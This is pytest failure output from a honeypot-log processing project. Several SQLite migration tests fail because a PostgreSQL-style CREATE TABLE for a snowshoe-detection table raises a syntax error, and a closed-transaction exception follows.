INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________ TestMigrationSystem.test_migration_with_data_sqlite ______________

self = <test_migration_system.TestMigrationSystem object at 0x7756b4572520>

    def test_migration_with_data_sqlite(self) -> None:
        """Test migration with existing data in SQLite."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Create initial schema (version 1)
            from cowrieprocessor.db.base import Base
    
            Base.metadata.create_all(engine)
    
            # Insert some test data
            Session = sessionmaker(bind=engine)
            session = Session()
    
            # Create schema state for version 1
            schema_state = SchemaState(key="schema_version", value="1")
            session.add(schema_state)
    
            # Insert test raw event
            raw_event = RawEvent(
                source="test",
                source_offset=1,
                payload={
                    "session": "test-session-123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2025-01-27T10:00:00Z",
                },
            )
            session.add(raw_event)
            session.commit()
    
            # Apply migrations
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:148: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b30af3f0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:18,492:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:18,493:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:18,501:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:18,502:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:18,505:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:18,507:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:18,508:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:18,512:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:18,513:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:18,514:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:18,515:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:18,519:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:18,519:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:18,520:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:18,521:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:18,522:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:18,522:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:18,523:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:18,523:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:18,525:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______________ TestMigrationSystem.test_migration_error_handling _______________

self = <test_migration_system.TestMigrationSystem object at 0x7756b4572650>

    def test_migration_error_handling(self) -> None:
        """Test migration error handling."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Create tables first
            from cowrieprocessor.db.base import Base
    
            Base.metadata.create_all(engine)
    
            # Create a corrupted schema state
            Session = sessionmaker(bind=engine)
            session = Session()
    
            # Create schema state with invalid version
            schema_state = SchemaState(key="schema_version", value="invalid")
            session.add(schema_state)
            session.commit()
    
            # Apply migrations - should handle invalid version gracefully
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:186: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b32398d0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:19,057:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:19,058:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:19,070:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:19,072:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:19,075:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:19,081:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:19,083:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:19,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:19,087:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:19,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:19,090:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:19,094:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:19,095:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:19,096:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:19,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,098:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,101:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,101:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,102:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______________ TestMigrationSystem.test_migration_from_scratch ________________

self = <test_migration_system.TestMigrationSystem object at 0x7756b43c4a70>

    def test_migration_from_scratch(self) -> None:
        """Test migration from completely empty database."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Apply migrations to empty database
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:204: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b3126350>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:19,646:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:19,647:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:19,654:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:19,655:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:19,656:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:19,659:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:19,662:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:19,665:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:19,666:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:19,667:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:19,670:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:19,671:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:19,672:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:19,672:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:19,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
